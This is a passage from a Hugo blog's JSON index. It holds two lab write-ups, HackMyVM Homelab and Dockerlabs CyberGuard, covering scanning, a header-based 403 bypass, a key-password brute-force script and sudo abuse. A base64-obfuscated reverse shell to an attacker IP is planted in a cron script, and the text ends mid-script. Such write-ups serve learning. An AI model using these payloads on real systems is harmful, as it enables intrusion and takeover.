
[{"content":"\r👋 关于本站 #\r欢迎来到我的第三个博客！🚀\n之前的服务器过期了，这次我决定从 WordPress 转向更轻量、可控的 Hugo ⚙️\n主题采用的是 Blowfish，并根据自己的需求做了一些定制修改 ✨\n🧑‍💻 Whoami #\rHYH\n🎓 信息安全专业在读大学生\n🛠️ 技能点：Web / Vue / SpringBoot / Android Compose\n📬 联系方式：\nQQ：1659854684 Email：1659854684@qq.com / hyhforevertop@gmail.com 📚 博客内容 #\r本站将专注分享：\nCTF / 渗透题解 🧨 实战笔记 📓 编程开发技巧（前端 \u0026amp; Android）💻 希望对你有所帮助，如果喜欢，欢迎留言支持 ❤️\n📌 最近 #\r一切都会好起来的 🙂\n继续记录，继续前行 ✍️\n","date":"2025-05-25","externalUrl":null,"permalink":"/about/","section":"HYH's Blog","summary":"","title":"About","type":"page"},{"content":"","date":"2025-05-25","externalUrl":null,"permalink":"/","section":"HYH's Blog","summary":"","title":"HYH's Blog","type":"page"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/tags/hackmyvm/","section":"Tags","summary":"","title":"Hackmyvm","type":"tags"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/categories/hackmyvm/","section":"Categories","summary":"","title":"Hackmyvm","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/homelab ❯ nmap 192.168.55.41 -sV -A -p- PORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.62 ((Unix))\r|_http-favicon: Apache on Mac OS X\r|_http-title: Mac OS X Server\r| http-methods: |_ Potentially risky methods: TRACE\r|_http-server-header: Apache/2.4.62 (Unix) 只有80端口开放了\nDir Fuzz #\r[root@kali] /home/kali/homelab ❯ dirsearch -u http://192.168.55.41 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289\rTarget: http://192.168.55.41/\r[04:47:54] Scanning: [04:48:00] 200 - 820B - /cgi-bin/printenv [04:48:00] 200 - 1KB - /cgi-bin/test-cgi [04:48:01] 200 - 4KB - /error.html [04:48:01] 200 - 8KB - /favicon.ico [04:48:02] 200 - 5KB - /index.html [04:48:05] 301 - 313B - /script -\u0026gt; http://192.168.55.41/script/ [04:48:05] 403 - 276B - /script/\r[04:48:06] 301 - 314B - /service -\u0026gt; http://192.168.55.41/service/ [04:48:06] 301 - 319B - /service?Wsdl -\u0026gt; http://192.168.55.41/service/?Wsdl\r[04:48:06] 301 - 312B - /style -\u0026gt; http://192.168.55.41/style/ [04:48:10] 403 - 276B - /server-status/ [04:48:11] 403 - 276B - /server-status\rTask Completed [root@kali] /home/kali/homelab ❯ curl http://192.168.55.41/service/ Whoa! But sorry, this service is only available for myself!# 看到有一个service路径，但是好像需要认证\n尝试扫描目录下的文件，发现一个vpn.txt，但是无法读取\n[root@kali] /home/kali/homelab ❯ feroxbuster -u \u0026#39;http://192.168.55.41/service/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt --dont-filter -s 403 ⏎\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.11.0\r───────────────────────────┬──────────────────────\r🎯 Target Url │ http://192.168.55.41/service/\r🚀 Threads │ 50\r📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r👌 Status Codes │ [403]\r💥 Timeout (secs) │ 7\r🦡 User-Agent │ feroxbuster/2.11.0\r💉 Config File │ /etc/feroxbuster/ferox-config.toml\r🔎 Extract Links │ true\r💲 Extensions │ [txt]\r🏁 HTTP methods │ [GET]\r🤪 Filter Wildcards │ false\r🔃 Recursion Depth │ 4\r───────────────────────────┴──────────────────────\r🏁 Press [ENTER] to use the Scan Management Menu™\r──────────────────────────────────────────────────\r403 GET 9l 28w 276c http://192.168.55.41/service/vpn.txt 换dirsearch扫一下\n[root@kali] /home/kali/homelab ❯ dirsearch -u http://192.168.55.41/service/\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289\rTarget: http://192.168.55.41/\r[04:56:21] Scanning: service/ [04:56:22] 403 - 276B - /service/.ht_wsr.txt [04:56:22] 403 - 276B - /service/.hta\r[04:56:22] 403 - 276B - /service/.htaccess\r[04:56:22] 403 - 276B - /service/.htaccess-dev\r[04:56:22] 403 - 276B - /service/.htaccess.bak\r[04:56:22] 403 - 276B - /service/.htaccess-marco\r[04:56:22] 403 - 276B - /service/.htaccess.bak1\r[04:56:22] 403 - 276B - /service/.htaccess.orig\r[04:56:22] 403 - 276B - /service/.htaccess.BAK\r[04:56:22] 403 - 276B - /service/.htaccess.old\r[04:56:22] 403 - 276B - /service/.htaccess.sample\r[04:56:22] 403 - 276B - /service/.htaccess.inc\r[04:56:22] 403 - 276B - /service/.htaccess-local\r[04:56:22] 403 - 276B - /service/.htaccess.txt\r[04:56:22] 403 - 276B - /service/.htaccess.save\r[04:56:22] 403 - 276B - /service/.htaccess/\r[04:56:22] 403 - 276B - /service/.htaccess_extra\r[04:56:22] 403 - 276B - /service/.htaccess_orig\r[04:56:22] 403 - 276B - /service/.htaccess_sc\r[04:56:22] 403 - 276B - /service/.htaccessBAK\r[04:56:22] 403 - 276B - /service/.htaccessOLD\r[04:56:22] 403 - 276B - /service/.htaccessOLD2\r[04:56:22] 403 - 276B - /service/.htaccess~ [04:56:22] 403 - 276B - /service/.htgroup\r[04:56:22] 403 - 276B - /service/.htm\r[04:56:22] 403 - 276B - /service/.html\r[04:56:22] 403 - 276B - /service/.htpasswd-old\r[04:56:22] 403 - 276B - /service/.htpasswd/\r[04:56:22] 403 - 276B - /service/.htpasswd.bak\r[04:56:22] 403 - 276B - /service/.htpasswd.inc\r[04:56:22] 403 - 276B - /service/.htpasswd\r[04:56:22] 403 - 276B - /service/.htpasswd_test\r[04:56:22] 403 - 276B - /service/.httr-oauth\r[04:56:22] 403 - 276B - /service/.htusers\r[04:56:22] 403 - 276B - /service/.htpasswds\r[04:56:27] 200 - 1KB - /service/ca.crt [04:56:29] 200 - 59B - /service/index.php [04:56:30] 200 - 59B - /service/index.php/login/ Task Completed 存在一个ca.crt的证书文件，那么还有可能存在其他的证书文件呢？\n[root@kali] /home/kali/homelab ❯ feroxbuster -u \u0026#39;http://192.168.55.41/service/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x crt,key ⏎\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.11.0\r───────────────────────────┬──────────────────────\r🎯 Target Url │ http://192.168.55.41/service/\r🚀 Threads │ 50\r📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r👌 Status Codes │ All Status Codes!\r💥 Timeout (secs) │ 7\r🦡 User-Agent │ feroxbuster/2.11.0\r💉 Config File │ /etc/feroxbuster/ferox-config.toml\r🔎 Extract Links │ true\r💲 Extensions │ [crt, key]\r🏁 HTTP methods │ [GET]\r🔃 Recursion Depth │ 4\r───────────────────────────┴──────────────────────\r🏁 Press [ENTER] to use the Scan Management Menu™\r──────────────────────────────────────────────────\r404 GET 9l 31w 273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r403 GET 9l 28w 276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 1l 10w 59c http://192.168.55.41/service/\r200 GET 20l 22w 1200c http://192.168.55.41/service/ca.crt\r200 GET 84l 139w 4492c http://192.168.55.41/service/client.crt\r200 GET 30l 36w 1862c http://192.168.55.41/service/client.key\r[####################] - 29s 661638/661638 0s found:4 errors:0 [####################] - 28s 661638/661638 23331/s http://192.168.55.41/service/ 可以看到扫出来三个文件，由于无法直接利用，之前又扫到一个vpn.txt，尝试扫描一下UDP端口\n[root@kali] /home/kali/homelab ❯ nmap 192.168.55.41 -sU -p 1194 PORT STATE SERVICE\r1194/udp open openvpn 可以看到openvpn的端口是开着的，可以联想到使用证书文件连接vpn到内部网络\n403 Bypass #\r还是得看看vpn.txt里的内容，这里尝试使用X-Forwared-For头进行绕过\n直接使用127.0.0.1不行，那么还是得爆破一下，用当前网卡段\n[root@kali] /home/kali/homelab ❯ echo {0..255} \u0026gt; ip.txt [root@kali] /home/kali/homelab ❯ ffuf -u \u0026#39;http://192.168.55.41/service/\u0026#39; -H \u0026#39;X-Forwarded-For: 192.168.55.FUZZ\u0026#39; -w ip.txt -fs 59 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.55.41/service/\r:: Wordlist : FUZZ: /home/kali/homelab/ip.txt\r:: Header : X-Forwarded-For: 192.168.55.FUZZ\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 59\r________________________________________________\r41 [Status: 200, Size: 326, Words: 41, Lines: 22, Duration: 6ms] 可以看到有一个特殊的值\n其中有一个用户名shinosawa\n[root@kali] /home/kali/homelab ❯ curl http://192.168.55.41/service/ -H \u0026#39;X-Forwarded-For: 192.168.55.41\u0026#39;\r# Last modified by shinosawa\r# on 2024-12-21\r# Example Configuration File\rclient\rdev tun\rproto udp\rremote ? ?\rresolv-retry infinite\rnobind\rpersist-key\rpersist-tun\rca ?\rcert ?\r# Regenerate a STRONG password for the KEY\r# Do NOT use a SAME password as other services et. SSH\r# it is DANGEROUS!\rkey ?\rcipher AES-256-GCM\rverb 3 PKCS8 Brute #\r其中的问号似乎就是用之前获得的东西来替换\n当然如果你打过HTB，那么就对openvpn的格式就比较熟悉了，大致是这样，将内容填进去就行了\nOpenvpn客户端配置文件参数说明client配置文件-CSDN博客\nclient\rdev tun\rproto udp\rremote 192.168.55.41 1194\rresolv-retry infinite\rnobind\rpersist-key\rpersist-tun\r\u0026lt;ca\u0026gt;\r\u0026lt;/ca\u0026gt;\r\u0026lt;cert\u0026gt;\r\u0026lt;/cert\u0026gt;\r\u0026lt;key\u0026gt;\r\u0026lt;/key\u0026gt;\rcipher AES-256-GCM\rverb 3 保存后尝试使用的话，会需要输入密码，原因就在于client.key设定了密码\n因此可以写一个脚本来进行爆破\n#!/bin/bash\r# 修复版 OpenSSL 私钥字典攻击脚本\r# 用法: ./dict_attack.sh \u0026lt;加密私钥文件\u0026gt; \u0026lt;字典文件\u0026gt;\r# 颜色定义\rRED=\u0026#39;\\033[0;31m\u0026#39;\rGREEN=\u0026#39;\\033[0;32m\u0026#39;\rNC=\u0026#39;\\033[0m\u0026#39; # 无颜色\r# 检查参数\rif [ $# -ne 2 ]; then\recho -e \u0026#34;${RED}错误: 需要两个参数${NC}\u0026#34;\recho \u0026#34;用法: $0 \u0026lt;加密私钥文件\u0026gt; \u0026lt;字典文件\u0026gt;\u0026#34;\rexit 1\rfi\rKEY_FILE=\u0026#34;$1\u0026#34;\rDICT_FILE=\u0026#34;$2\u0026#34;\rDECRYPTED_KEY=\u0026#34;decrypted_$(date +%s).key\u0026#34;\r# 检查文件\r[ -f \u0026#34;$KEY_FILE\u0026#34; ] || { echo -e \u0026#34;${RED}错误: 密钥文件不存在${NC}\u0026#34;; exit 1; }\r[ -f \u0026#34;$DICT_FILE\u0026#34; ] || { echo -e \u0026#34;${RED}错误: 字典文件不存在${NC}\u0026#34;; exit 1; }\r# 检查 OpenSSL\rcommand -v openssl \u0026gt;/dev/null || { echo -e \u0026#34;${RED}错误: OpenSSL 未安装${NC}\u0026#34;; exit 1; }\r# 获取字典行数\rTOTAL=$(wc -l \u0026lt; \u0026#34;$DICT_FILE\u0026#34;)\rCOUNT=0\rSTART=$(date +%s)\recho -e \u0026#34;目标密钥: $KEY_FILE\u0026#34;\recho -e \u0026#34;使用字典: $DICT_FILE (共 $TOTAL 个密码)\u0026#34;\recho -e \u0026#34;开始攻击...\\n\u0026#34;\r# 主循环\rwhile IFS= read -r PASS; do\r((COUNT++))\r# 更安全的进度计算（不使用bc）\rPERCENT=$((COUNT*100/TOTAL))\r# 每100次或最后一行显示进度\rif [ $((COUNT % 100)) -eq 0 ] || [ $COUNT -eq $TOTAL ]; then\rprintf \u0026#34;进度: %3d%% (%d/%d) 当前密码: %-20s\\r\u0026#34; $PERCENT $COUNT $TOTAL \u0026#34;$PASS\u0026#34;\rfi\r# 尝试解密\rif openssl pkcs8 -in \u0026#34;$KEY_FILE\u0026#34; -out \u0026#34;$DECRYPTED_KEY\u0026#34; -passin \u0026#34;pass:$PASS\u0026#34; 2\u0026gt;/dev/null; then\recho -e \u0026#34;\\n\\n${GREEN}成功找到密码: $PASS${NC}\u0026#34;\recho -e \u0026#34;${GREEN}解密后的密钥已保存到: $DECRYPTED_KEY${NC}\u0026#34;\r# 验证密钥\recho -e \u0026#34;\\n密钥信息:\u0026#34;\rif openssl rsa -in \u0026#34;$DECRYPTED_KEY\u0026#34; -noout -text 2\u0026gt;/dev/null | head -n 5; then\recho -e \u0026#34;${GREEN}密钥验证成功!${NC}\u0026#34;\relse\recho -e \u0026#34;${RED}警告: 密钥验证失败${NC}\u0026#34;\rfi\rexit 0\rfi\rdone \u0026lt; \u0026#34;$DICT_FILE\u0026#34;\r# 攻击失败\recho -e \u0026#34;\\n\\n${RED}攻击失败，未找到正确密码${NC}\u0026#34;\recho -e \u0026#34;已尝试 $COUNT 个密码\u0026#34;\recho -e \u0026#34;耗时: $(( $(date +%s) - $START )) 秒\u0026#34;\rexit 1 当然这里为了节省时间，我直接就换了一个字典😂\n[root@kali] /home/kali/homelab ❯ ./poc.sh client.key /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt ⏎\r目标密钥: client.key\r使用字典: /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt (共 1000000 个密码)\r开始攻击...\r进度: 2% (23600/1000000) 当前密码: hobbs 成功找到密码: hiro\r解密后的密钥已保存到: decrypted_1747218048.key\r密钥信息:\rPrivate-Key: (2048 bit, 2 primes)\rmodulus:\r00:a4:18:af:59:be:6f:36:31:64:7f:6b:60:da:ba:\rec:89:3e:10:7b:90:4c:99:1b:55:fe:d2:c1:77:8d:\r47:15:a9:59:f8:df:9c:48:ed:32:0a:2c:56:fa:00:\r密钥验证成功! 然后连接上去\nUser #\r用fscan看看其他主机，除了自己，还有一个10.8.0.1，也就是靶机，但没什么用。\n[root@kali] /home/kali/Desktop ❯ ./fscan -h 10.8.0.0/24 ┌──────────────────────────────────────────────┐\r│ ___ _ │\r│ / _ \\ ___ ___ _ __ __ _ ___| | __ │\r│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │\r│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │\r│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │\r└──────────────────────────────────────────────┘\rFscan Version: 2.0.0\r[2025-05-14 08:24:06] [INFO] 暴力破解线程数: 1 [2025-05-14 08:24:06] [INFO] 开始信息扫描\r[2025-05-14 08:24:06] [INFO] CIDR范围: 10.8.0.0-10.8.0.255\r[2025-05-14 08:24:06] [INFO] 生成IP范围: 10.8.0.0.%!d(string=10.8.0.255) - %!s(MISSING).%!d(MISSING)\r[2025-05-14 08:24:06] [INFO] 解析CIDR 10.8.0.0/24 -\u0026gt; IP范围 10.8.0.0-10.8.0.255\r[2025-05-14 08:24:06] [INFO] 最终有效主机数量: 256\r[2025-05-14 08:24:06] [INFO] 开始主机扫描\r[2025-05-14 08:24:06] [SUCCESS] 目标 10.8.0.2 存活 (ICMP)\r[2025-05-14 08:24:06] [SUCCESS] 目标 10.8.0.1 存活 (ICMP)\r[2025-05-14 08:24:09] [INFO] 存活主机数量: 2\r[2025-05-14 08:24:09] [INFO] 有效端口数量: 233\r[2025-05-14 08:24:10] [SUCCESS] 端口开放 10.8.0.1:80 回头再看一下日志，发现另一个ip\n再扫一下他的网段\n[root@kali] /home/kali/Desktop ❯ ./fscan -h 10.176.13.0/24\r┌──────────────────────────────────────────────┐\r│ ___ _ │\r│ / _ \\ ___ ___ _ __ __ _ ___| | __ │\r│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │\r│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │\r│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │\r└──────────────────────────────────────────────┘\rFscan Version: 2.0.0\r[2025-05-14 08:31:47] [INFO] 暴力破解线程数: 1 [2025-05-14 08:31:47] [INFO] 开始信息扫描\r[2025-05-14 08:31:47] [INFO] CIDR范围: 10.176.13.0-10.176.13.255\r[2025-05-14 08:31:47] [INFO] 生成IP范围: 10.176.13.0.%!d(string=10.176.13.255) - %!s(MISSING).%!d(MISSING)\r[2025-05-14 08:31:47] [INFO] 解析CIDR 10.176.13.0/24 -\u0026gt; IP范围 10.176.13.0-10.176.13.255\r[2025-05-14 08:31:47] [INFO] 最终有效主机数量: 256\r[2025-05-14 08:31:47] [INFO] 开始主机扫描\r[2025-05-14 08:31:47] [SUCCESS] 目标 10.176.13.37 存活 (ICMP)\r[2025-05-14 08:31:50] [INFO] 存活主机数量: 1\r[2025-05-14 08:31:50] [INFO] 有效端口数量: 233\r[2025-05-14 08:31:50] [SUCCESS] 端口开放 10.176.13.37:22\r[2025-05-14 08:31:50] [SUCCESS] 端口开放 10.176.13.37:80\r[2025-05-14 08:31:50] [SUCCESS] 服务识别 10.176.13.37:22 =\u0026gt; [ssh] 版本:9.9 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_9.9.]\r[2025-05-14 08:31:55] [SUCCESS] 服务识别 10.176.13.37:80 =\u0026gt; [http]\r[2025-05-14 08:31:55] [INFO] 存活端口数量: 2 找到一个存活IP：10.176.13.37，也是指向靶机，但是多了一个ssh端口开放\n尝试使用之前在XFF Bypass部分中获取到的用户名，密码用hiro成功登录\n[root@kali] /home/kali/homelab ❯ ssh shinosawa@10.176.13.37 ⏎\rshinosawa@10.176.13.37\u0026#39;s password: homelab:~$ id\ruid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)\rhomelab:~$ Root #\r查看sudo -l\nhomelab:~$ sudo -l\rMatching Defaults entries for shinosawa on homelab:\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rRunas and Command-specific defaults for shinosawa:\rDefaults!/usr/sbin/visudo env_keep+=\u0026#34;SUDO_EDITOR EDITOR VISUAL\u0026#34;\rUser shinosawa may run the following commands on homelab:\r(ALL) NOPASSWD: /home/shinosawa/deepseek 拖出来看看伪代码，似乎是一个栈溢出\n__int64 vuln()\r{\rchar s[64]; // [rsp+0h] [rbp-40h] BYREF\rprintf(\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;);\rfflush(stdout);\rfgets(s, 256, stdin);\rreturn typewriter_output();\r}\rvoid __noreturn execute()\r{\rputs(\u0026#34;[*] in execute()\u0026#34;);\rfflush(stdout);\rputs(\u0026#34;[*] running shell\u0026#34;);\rfflush(stdout);\rexecl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, 0LL);\rperror(\u0026#34;execl failed\u0026#34;);\rexit(1);\r} 我尝试过这种方式\nhomelab:~$ cat payload.bin | sudo /home/shinosawa/deepseek \u0026gt;\u0026gt;\u0026gt; \u0026lt;think\u0026gt;\rEmm, I\u0026#39;m so tired and don\u0026#39;t want to answer any questions.\r\u0026lt;/think\u0026gt;\rThinking has stopped.\rThe server is busy, please try again later.\r[*] in execute()\r[*] running shell 但是好像并不能获得到shell，我也尝试过ret2shellcode解法，但是好像没有可执行段（可能是我pwn太菜了\n回到机器本身，注意到该文件在用户的家目录下，因此可以任意修改。\nhomelab:~$ rm deepseek rm: remove \u0026#39;deepseek\u0026#39;? y\rhomelab:~$ echo \u0026#39;sh\u0026#39; \u0026gt; deepseek\rhomelab:~$ chmod +x deepseek homelab:~$ sudo /home/shinosawa/deepseek /home/shinosawa # id\ruid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\r/home/shinosawa # Summary #\rUser: 目录扫描得到openvpn的关键文件，通过pkcs8爆破密码成功进入内网，扫描内网存活主机，通过22端口登录。\nRoot: 家目录直接修改文件。\n","date":"2025-05-17","externalUrl":null,"permalink":"/posts/2025/05/hackmyvm-homelab/","section":"Posts","summary":"","title":"HackMyVM-Homelab","type":"posts"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/links/","section":"Links","summary":"","title":"Links","type":"links"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2025-05-13","externalUrl":null,"permalink":"/tags/dockerlabs/","section":"Tags","summary":"","title":"Dockerlabs","type":"tags"},{"content":"","date":"2025-05-13","externalUrl":null,"permalink":"/categories/dockerlabs/","section":"Categories","summary":"","title":"Dockerlabs","type":"categories"},{"content":"\rMachine Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/ciberguard ❯ nmap 172.17.0.2 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 01:f6:3a:98:23:dc:8b:00:f0:5c:d5:50:07:f9:ec:e7 (ECDSA)\r|_ 256 b0:4e:cb:2a:e0:ac:cf:4c:14:7b:23:57:00:6d:12:1d (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: CyberGuard - Seguridad Digital Feroxbuster #\r[root@kali] /home/kali/ciberguard ❯ feroxbuster -u \u0026#39;http://172.17.0.2/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt ___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.11.0\r───────────────────────────┬──────────────────────\r🎯 Target Url │ http://172.17.0.2/\r🚀 Threads │ 50\r📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r👌 Status Codes │ All Status Codes!\r💥 Timeout (secs) │ 7\r🦡 User-Agent │ feroxbuster/2.11.0\r💉 Config File │ /etc/feroxbuster/ferox-config.toml\r🔎 Extract Links │ true\r💲 Extensions │ [php, txt]\r🏁 HTTP methods │ [GET]\r🔃 Recursion Depth │ 4\r───────────────────────────┴──────────────────────\r🏁 Press [ENTER] to use the Scan Management Menu™\r──────────────────────────────────────────────────\r404 GET 9l 31w 272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r301 GET 9l 28w 309c http://172.17.0.2/images =\u0026gt; http://172.17.0.2/images/\r200 GET 77l 154w 2111c http://172.17.0.2/archiv/script.js\r200 GET 311l 560w 5015c http://172.17.0.2/archiv/styles.css\r200 GET 231l 1204w 142716c http://172.17.0.2/images/Imagen(1).jpg\r200 GET 59l 323w 28431c http://172.17.0.2/images/Image.jpg\r200 GET 103l 363w 5100c http://172.17.0.2/\r200 GET 279l 1484w 159900c http://172.17.0.2/images/Imagen%282%29.jpg\r200 GET 12l 114w 7473c http://172.17.0.2/images/Iconn.png\r200 GET 190l 1007w 91180c http://172.17.0.2/images/Imagen%285%29.png.jpg\r200 GET 195l 1148w 120954c http://172.17.0.2/images/Imagen%283%29.jpg\r200 GET 243l 1220w 121023c http://172.17.0.2/images/Imagen%284%29.jpg\r200 GET 231l 1204w 142716c http://172.17.0.2/images/Imagen%281%29.jpg\r301 GET 9l 28w 309c http://172.17.0.2/archiv =\u0026gt; http://172.17.0.2/archiv/\r403 GET 9l 28w 275c http://172.17.0.2/server-status\r[####################] - 29s 661689/661689 0s found:14 errors:1341 [####################] - 28s 661638/661638 23558/s http://172.17.0.2/ [####################] - 0s 661638/661638 3576422/s http://172.17.0.2/images/ =\u0026gt; Directory listing (add --scan-dir-listings to scan)\r[####################] - 0s 661638/661638 330819000/s http://172.17.0.2/archiv/ =\u0026gt; Directory listing (add --scan-dir-listings to scan) Own chloe #\r查看到目录下有一个**/archiv/script.js**\nconst usuariosPermitidos = {\r\u0026#39;admin\u0026#39;: \u0026#39;CyberSecure123\u0026#39;,\r\u0026#39;cliente\u0026#39;: \u0026#39;Password123\u0026#39;,\r\u0026#39;chloe\u0026#39; : \u0026#39;chloe123\u0026#39;\r}; 其中chloe可以用于ssh登录\nOwn veronica #\r可以直接进入到家目录，在.bash_history中得到密码\nchloe@6e97f12b7ffe:/home/veronica$ ls -al\rtotal 56\rdrwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 .\rdrwxr-xr-x 1 root root 4096 Apr 16 23:03 ..\r-rw-r--r-- 1 veronica veronica 25 May 13 09:25 .bash_history\r-rw-r--r-- 1 veronica veronica 220 Apr 16 23:00 .bash_logout\r-rw-r--r-- 1 veronica veronica 3771 Apr 16 23:00 .bashrc\rdrwx------ 2 veronica veronica 4096 Apr 18 10:39 .cache\rdrwxrwxr-x 3 veronica veronica 4096 Apr 18 11:13 .local\r-rw-r--r-- 1 veronica veronica 807 Apr 16 23:00 .profile\r-rw------- 1 veronica veronica 7 Apr 18 16:35 .python_history\rdrwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Desktop\rdrwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Documents\rdrwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Images\rchloe@6e97f12b7ffe:/home/veronica$ cat .bash_history dmVyb25pY2ExMjMK 这个dmVyb25pY2ExMjMK就是密码，不用解密\nOwn pablo #\r查看一下定时任务\nchloe@6e97f12b7ffe:/home/veronica/.local$ cat /etc/crontab # /etc/crontab: system-wide crontab\r# Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39;\r# command to install the new version when you edit this file\r# and files in /etc/cron.d. These files also have username fields,\r# that none of the other crontabs do.\rSHELL=/bin/sh\r# You can also override PATH, but by default, newer versions inherit it from the environment\r#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r# Example of job definition:\r# .---------------- minute (0 - 59)\r# | .------------- hour (0 - 23)\r# | | .---------- day of month (1 - 31)\r# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...\r# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\r# | | | | |\r# * * * * * user-name command to be executed\r17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly\r25 6 * * * root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily; }\r47 6 * * 7 root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly; }\r52 6 1 * * root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly; }\r* * * * * pedro /home/veronica/.local/script-h.sh \u0026gt; /tmp/hora/hora.log 2\u0026gt;\u0026amp;1\r# 当前用户可以直接修改这个脚本\nveronica@6e97f12b7ffe:~/.local$ echo \u0026#39;printf KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0IDA+JjEpICY=|base64 -d|bash\u0026#39; \u0026gt;\u0026gt; script-h.sh Root #\r查看sudo -l\npablo@6e97f12b7ffe:~$ sudo -l\rMatching Defaults entries for pablo on 6e97f12b7ffe:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser pablo may run the following commands on 6e97f12b7ffe:\r(ALL) NOPASSWD: /usr/bin/python3 /opt/nllns/clean_symlink.py *.jpg 查看一下脚本的内容\npablo@6e97f12b7ffe:~$ cat /opt/nllns/clean_symlink.py #!/usr/bin/env python3\rimport os\rimport sys\rimport shutil\rQUAR_DIR = \u0026#34;/var/quarantined\u0026#34;\rif len(sys.argv) != 2:\rprint(\u0026#34;¡Se requiere un argumento: el enlace simbólico a un archivo .jpg!\u0026#34;)\rsys.exit(1)\rLINK = sys.argv[1]\rif not LINK.endswith(\u0026#39;.jpg\u0026#39;):\rprint(\u0026#34;¡El primer argumento debe ser un archivo .jpg!\u0026#34;)\rsys.exit(2)\rif os.path.islink(LINK):\rLINK_NAME = 